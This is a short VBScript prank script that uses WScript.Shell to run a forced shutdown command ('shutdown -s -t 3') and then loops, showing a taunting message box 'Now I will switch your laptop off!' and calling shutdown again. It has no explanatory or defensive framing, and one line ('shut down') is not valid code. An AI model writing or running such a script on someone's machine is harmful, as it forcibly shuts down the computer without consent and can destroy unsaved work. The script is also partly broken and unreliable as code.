Sub oo()
	dim wsh
	set wsh=CreateObject ("wscript.shell")
	wsh.run ("shutdown -s -t 3")
	do
		
		msgbox "Now I will switch your laptop off!"
		wsh.run "shutdown"
		shut down
	loop
end sub
oo()